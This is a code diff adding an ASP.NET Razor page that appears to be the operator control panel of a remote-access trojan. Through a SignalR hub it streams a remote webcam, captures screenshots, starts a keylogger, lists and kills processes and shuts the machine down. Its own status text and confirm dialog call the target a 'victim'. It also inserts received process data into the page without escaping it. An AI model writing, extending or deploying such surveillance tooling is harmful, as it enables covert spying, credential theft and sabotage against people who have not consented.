@@ -1,0 +1,248 @@
+﻿@{
+    ViewData["Title"] = "Home Page";
+}
+
+<div class="row">
+    <div class="col-12 tm-block-col">
+        <div class="tm-bg-primary-dark tm-block tm-block-taller tm-block-overflow">
+            <h2 class="tm-block-title">Live Webcam Stream</h2>
+            <div class="tm-block-content text-center">
+                
+                <div style="position: relative; display: inline-block; width: 100%; max-width: 800px;">
+                    <img id="webcamDisplay" 
+                         src="" 
+                         style="width: 100%; border: 2px solid #00ff00; border-radius: 5px; display: none; box-shadow: 0 0 15px #00ff00;transform: scaleX(-1);" 
+                         alt="Webcam Stream" />
+                    
+                    <div id="placeholder" style="border: 2px dashed #6c757d; padding: 100px 0; color: #adb5bd;">
+                        <i class="fas fa-video-slash fa-3x mb-3"></i>
+                        <h4>Waiting for connection...</h4>
+                    </div>
+                </div>
+
+                <div class="mt-4">
+                    <p id="statusText" class="text-white mb-3" style="font-family: monospace; font-size: 1.2em;">
+                        <span style="color: yellow;">●</span> Status: Disconnected
+                    </p>
+                    
+                    <button onclick="testConnection()" class="btn btn-small btn-primary">
+                        Test SignalR
+                    </button>
+                    <div class="mt-3">
+                    <button onclick="startWebcam()" class="btn btn-success btn-lg">
+                        <i class="fas fa-video"></i> BẬT WEBCAM
+                    </button>
+    
+                    <button onclick="sendCommand('QUIT')" class="btn btn-danger btn-lg">
+                        <i class="fas fa-stop"></i> TẮT
+                    </button>
+                </div>
+                </div>
+
+            </div>
+        </div>
+    </div>
+</div>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/microsoft-signalr/6.0.1/signalr.min.js"></script>
+
+<!-- --- PHẦN ĐIỀU KHIỂN (CONTROL PANEL) --- -->
+<div class="row tm-content-row">
+    
+    <!-- BLOCK 1: CÁC LỆNH ĐƠN GIẢN -->
+    <div class="col-sm-12 col-md-12 col-lg-4 col-xl-4 tm-block-col">
+        <div class="tm-bg-primary-dark tm-block">
+            <h2 class="tm-block-title">Quick Actions</h2>
+            <div class="tm-block-content">
+                <div class="d-grid gap-2">
+                    <!-- Nút Chụp màn hình -->
+                    <button onclick="sendCommand('TAKEPIC')" class="btn btn-primary btn-block text-uppercase mb-2">
+                        <i class="fas fa-camera tm-section-icon"></i> Screenshot
+                    </button>
+                    
+                    <!-- Nút Keylogger -->
+                    <button onclick="sendCommand('KEYLOG')" class="btn btn-warning btn-block text-uppercase mb-2">
+                        <i class="fas fa-keyboard tm-section-icon"></i> Start Keylogger
+                    </button>
+
+                    <!-- Nút Shutdown -->
+                    <button onclick="confirmShutdown()" class="btn btn-danger btn-block text-uppercase">
+                        <i class="fas fa-power-off tm-section-icon"></i> Shutdown PC
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- BLOCK 2: DANH SÁCH (App/Process) -->
+    <div class="col-sm-12 col-md-12 col-lg-8 col-xl-8 tm-block-col">
+        <div class="tm-bg-primary-dark tm-block tm-block-taller tm-block-overflow">
+            <div class="tm-block-title-container d-flex justify-content-between">
+                <h2 class="tm-block-title">List Data</h2>
+                <div>
+                    <button onclick="sendCommand('APPLICATION')" class="btn btn-small btn-info me-2">Get Apps</button>
+                    <button onclick="sendCommand('PROCESS')" class="btn btn-small btn-secondary">Get Processes</button>
+                </div>
+            </div>
+            
+            <!-- Bảng hiển thị dữ liệu -->
+            <div class="tm-block-content">
+                <table class="table table-hover table-dark tm-table-small-font">
+                    <thead>
+                        <tr id="tableHeader">
+                            <th scope="col">ID</th>
+                            <th scope="col">NAME</th>
+                            <th scope="col">DETAILS</th>
+                            <th scope="col">ACTION</th>
+                        </tr>
+                    </thead>
+                    <tbody id="tableBody">
+                        <!-- Dữ liệu sẽ được JS đổ vào đây -->
+                        <tr><td colspan="4" class="text-center text-muted">No data loaded...</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <!-- BLOCK 3: KẾT QUẢ (Keylog / Screenshot View) -->
+    <div class="col-12 tm-block-col">
+        <div class="tm-bg-primary-dark tm-block">
+            <h2 class="tm-block-title">Result Output</h2>
+            <div class="tm-block-content">
+                
+                <!-- Vùng hiển thị Keylog -->
+                <textarea id="txtKeylog" rows="10" class="form-control bg-dark text-white" 
+                          style="font-family: monospace; display:none;" readonly></textarea>
+
+                <!-- Vùng hiển thị Ảnh Chụp Màn Hình -->
+                <div id="screenshotArea" style="display:none; text-align: center;">
+                    <img id="imgScreenshot" src="" style="max-width: 100%; border: 1px solid white;" />
+                    <br/>
+                    <a id="btnDownload" href="#" download="screenshot.png" class="btn btn-success mt-2">Download Image</a>
+                </div>
+
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    // Khởi tạo kết nối
+    var connection = new signalR.HubConnectionBuilder()
+        .withUrl("/webcamHub") 
+        .withAutomaticReconnect() // Tự kết nối lại nếu rớt mạng
+        .build();
+
+    // --- NHẬN ẢNH TỪ SERVER ---
+    connection.on("ReceiveImage", function (base64Data) {
+        var img = document.getElementById("webcamDisplay");
+        var placeholder = document.getElementById("placeholder");
+        var status = document.getElementById("statusText");
+
+        // Hiển thị ảnh, ẩn placeholder
+        img.style.display = "inline-block";
+        img.src = "data:image/jpeg;base64," + base64Data;
+        placeholder.style.display = "none";
+
+        // Cập nhật trạng thái
+        status.innerHTML = '<span style="color: #00ff00;">●</span> Status: Receiving Data...';
+    });
+
+    // --- BẮT ĐẦU KẾT NỐI ---
+    async function startSignalR() {
+        try {
+            await connection.start();
+            console.log("SignalR Connected.");
+            document.getElementById("statusText").innerHTML = '<span style="color: cyan;">●</span> Status: Connected to Hub (Waiting for Victim...)';
+        } catch (err) {
+            console.error(err);
+            setTimeout(startSignalR, 5000); // Thử lại sau 5s
+        }
+    }
+
+    // Chạy ngay khi web tải xong
+    startSignalR();
+
+    // Hàm chuyên dùng để bật Webcam (Gửi 2 dòng liên tiếp)
+    function startWebcam() {
+        // Gửi lệnh mở
+        sendCommand('WEBCAM');
+    
+        // Gửi tiếp tham số thời gian (0 = vô hạn) sau 100ms để đảm bảo tách dòng
+        setTimeout(function() {
+            sendCommand('0'); 
+        }, 100);
+    }
+
+    // Hàm test thử
+    function testConnection() {
+        alert("SignalR State: " + connection.state);
+    }
+    // --- HÀM GỬI LỆNH LÊN SERVER ---
+    function sendCommand(cmd) {
+        // Gọi hàm SendCommand bên WebcamHub (Backend)
+        connection.invoke("SendCommand", cmd).catch(function (err) {
+            return console.error(err.toString());
+        });
+        console.log("Sent command: " + cmd);
+    }
+
+    // Hàm xác nhận tắt máy
+    function confirmShutdown() {
+        if (confirm("Bạn có chắc chắn muốn TẮT MÁY nạn nhân không?")) {
+            sendCommand('SHUTDOWN');
+        }
+    }
+
+    // --- LẤY DỮ LIỆU TRẢ VỀ TỪ SERVER ---
+    
+    // 1. Nhận danh sách Process/App (Dạng JSON hoặc chuỗi phân tách)
+    connection.on("ReceiveListData", function (jsonString) {
+        // Giả sử Server gửi về mảng JSON: [{"id": 1, "name": "Chrome", "threads": 10}, ...]
+        var data = JSON.parse(jsonString);
+        var html = "";
+        
+        data.forEach(item => {
+            html += `<tr>
+                        <td>${item.id}</td>
+                        <td><b>${item.name}</b></td>
+                        <td>${item.details}</td>
+                        <td>
+                           <button onclick="killProcess(${item.id})" class="btn btn-sm btn-danger">KILL</button>
+                        </td>
+                     </tr>`;
+        });
+        document.getElementById("tableBody").innerHTML = html;
+    });
+
+    // 2. Nhận Keylog (Dạng văn bản)
+    connection.on("ReceiveKeylog", function (textData) {
+        document.getElementById("screenshotArea").style.display = "none";
+        var txt = document.getElementById("txtKeylog");
+        txt.style.display = "block";
+        txt.value += textData + "\n"; // Cộng dồn log
+        txt.scrollTop = txt.scrollHeight; // Tự cuộn xuống dưới
+    });
+
+    // 3. Nhận Ảnh Chụp Màn Hình (Base64)
+    connection.on("ReceiveScreenshot", function (base64Img) {
+        document.getElementById("txtKeylog").style.display = "none";
+        var area = document.getElementById("screenshotArea");
+        var img = document.getElementById("imgScreenshot");
+        var btn = document.getElementById("btnDownload");
+
+        area.style.display = "block";
+        img.src = "data:image/png;base64," + base64Img;
+        btn.href = img.src; // Gán link để tải về
+    });
+
+    // Hàm gửi lệnh Kill Process
+    function killProcess(id) {
+        if(confirm("Kill process ID: " + id + "?")) {
+            connection.invoke("SendCommand", "KILLID|" + id);
+        }
+    }
+</script>
+
+
+
